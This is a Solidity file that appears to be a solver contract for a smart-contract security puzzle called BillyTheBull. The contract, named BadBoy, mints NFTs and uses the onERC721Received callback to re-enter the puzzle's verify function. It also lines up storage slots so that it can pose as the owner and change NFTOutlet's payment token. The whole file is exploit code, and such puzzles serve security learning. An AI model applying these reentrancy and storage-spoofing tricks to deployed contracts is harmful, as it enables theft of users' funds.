// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { BillyTheBull } from "../src/BillyTheBull.sol";
import { NFTOutlet } from "../src/NFTOutlet.sol";
import { BoredSlothYachtClub } from "../src/tokens/BoredSlothYachtClub.sol";

interface Solver {
    function getMagicFlag(uint, uint, bytes32, bool) external returns (bytes memory);
}

contract BadBoy {
    address owner;
    NFTOutlet nftOutlet;
    uint nftPrice;
    uint[1] _gap;
    bool flag;
    BillyTheBull immutable puzzle;
    address immutable bsyc;
    address immutable solver;
    uint immutable t1;
    uint immutable t2;
    bytes32 immutable salt;

    constructor(uint _t1, uint _t2, bytes32 _salt, address _puzzle, address _bsyc) {
        solver = msg.sender;
        t1 = _t1;
        t2 = _t2;
        salt = _salt;
        puzzle = BillyTheBull(_puzzle);
        bsyc = _bsyc;

        uint indexToMint = puzzle.nftPrice();
        BoredSlothYachtClub(bsyc).mint(indexToMint);
        BoredSlothYachtClub(bsyc).mint(indexToMint + 1e18);
        BoredSlothYachtClub(bsyc).setApprovalForAll(address(nftOutlet), true);
    }

    function onERC721Received(address, address, uint256, bytes memory) external returns (bytes4) {
        if (!flag) {
            flag = true;
            uint solution = uint(keccak256(Solver(solver).getMagicFlag(t1, t2, salt, true)));
            puzzle.verify(t2 << 128 | t1, solution);
        }
        return this.onERC721Received.selector;
    }

    function getMagicFlag() external returns (bytes memory) {
        if (address(NFTOutlet(nftOutlet).paymentToken()) == bsyc) {
            return bytes("");
        } else {
            address oldOwner = owner;
            owner = address(this);
            nftOutlet.changePaymentToken(bsyc);
            owner = oldOwner;
            return Solver(solver).getMagicFlag(t1, t2, salt, true);
        }
    }
}
